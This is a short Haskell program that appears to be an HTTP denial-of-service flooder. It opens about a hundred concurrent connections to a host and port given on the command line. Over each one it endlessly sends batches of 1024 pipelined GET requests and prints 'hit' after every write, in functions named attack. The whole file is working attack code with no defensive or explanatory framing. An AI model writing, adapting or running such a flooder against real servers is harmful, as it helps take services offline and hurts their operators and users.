{-# LANGUAGE OverloadedStrings #-}
import Network
import Control.Monad
import qualified Data.ByteString.Char8 as B
import Control.Concurrent
import Foreign.Marshal.Alloc
import GHC.IO.Handle
import System.Environment

main = do
  [host, port] <- getArgs
  sh <- connectTo host $ PortNumber $ fromIntegral $ read port
  forM_ ([0..98]::[Int]) $ \_ -> forkIO (attack host (fromIntegral (read port)))
  attack1 sh

attack host port = (connectTo host $ PortNumber port) >>= attack1

attack1 sh = do
  forkIO $ do
    forever $ B.hGet sh (1024*1024)
  forever $ do
    B.hPutStr sh prepmsg
    putStrLn "hit"

prepmsg :: B.ByteString
prepmsg = B.concat $ take 1024 $ repeat "GET /robgssp HTTP/1.1\r\n\r\n"
